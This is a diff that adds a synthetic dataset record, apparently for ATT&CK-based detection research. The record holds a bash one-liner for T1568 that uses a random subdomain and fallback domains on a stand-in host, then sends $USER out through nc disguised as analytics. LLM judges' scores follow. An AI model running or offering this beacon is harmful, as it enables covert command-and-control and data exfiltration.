@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"base=cdn-example.net; rand=$(head -c16 /dev/urandom | tr -dc a-z0-9 | head -c8); d=\\\"$rand.$base\\\"; host=''; ip=''; for h in \\\"$d\\\" \\\"$base\\\" static.$base; do ip=$(getent hosts \\\"$h\\\" | awk '{print $1}' | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux x86_64)\\\"; body=\\\"evt=pageview&u=$USER\\\"; printf 'POST /collect HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$host\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Uses a random subdomain (runtime DGA-like behavior) with fallback domains and resolves via system NSS (getent); posts telemetry-looking data to a generic collection path.",
+  "rationale_steps": [
+    "Generate random subdomain to force dynamic DNS lookup each run.",
+    "Resolve with getent to use system resolver and caches.",
+    "Fallback to base and static domains for persistence.",
+    "Imitate analytics POST over HTTP via nc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-763c9a16",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid flag formats, appropriate command separators, and correct escape sequences throughout the complex bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by generating a random subdomain at runtime, implementing fallback resolution logic, and establishing communication that mimics legitimate telemetry traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:47:15.476773Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct bash syntax, balanced quotes, proper command separators, and valid use of command substitutions and conditional logic.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1568 by algorithmically generating a random subdomain at runtime, dynamically resolving it with fallbacks, and then using the resolved endpoint for plausible C2 beaconing via HTTP.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:47:30.012591Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting and valid Bash constructs, control flow, and flags.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements DGA-like dynamic resolution (random subdomain generation, fallback, getent-based resolution) and an HTTP POST via nc, but double-quoting the bash -c payload causes premature expansion in the invoking shell, likely breaking the intended runtime behavior.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T07:48:51.732573Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
